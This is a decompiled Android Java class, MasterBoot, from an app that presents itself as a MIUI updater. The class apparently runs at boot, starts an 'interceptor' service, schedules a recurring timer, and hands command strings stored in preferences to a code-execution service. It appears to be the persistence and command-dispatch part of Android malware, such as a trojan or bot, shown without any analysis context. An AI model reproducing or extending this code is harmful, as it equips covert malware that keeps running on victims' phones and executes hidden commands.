package brandmangroupe.miui.updater;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.SystemClock;
import java.util.Calendar;
import java.util.Map;

public class MasterBoot extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        context.startService(new Intent(context, MasterInterceptor.class));
        String timer = "";
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 128);
            if (appInfo.metaData != null) {
                timer = appInfo.metaData.getString("timer");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        int reltime = 60;
        if (timer.length() > 2) {
            reltime = Integer.parseInt(timer.substring(1));
        }
        AlarmManager manager = (AlarmManager) context.getSystemService("alarm");
        long time = SystemClock.elapsedRealtime() + 5000;
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.add(13, 10);
        manager.setRepeating(0, time, (long) (reltime * 1000), PendingIntent.getBroadcast(context, 0, new Intent(context, MasterTimer.class), 0));
        Map<String, ?> items = context.getSharedPreferences("Boot_conf", 0).getAll();
        if (items.size() > 0) {
            for (String s : items.keySet()) {
                String cmd = getcmd(context, s);
                if (cmd.length() > 2) {
                    Intent intent2 = new Intent(context, GlobalCode.class);
                    intent2.putExtra("content", cmd);
                    intent2.putExtra("type", "TriggerBoot:" + s);
                    intent2.putExtra("data", "");
                    context.startService(intent2);
                }
            }
        }
    }

    public String getcmd(Context ctx, String command) {
        return ctx.getSharedPreferences("Cmd_conf", 0).getString(command, "");
    }
}
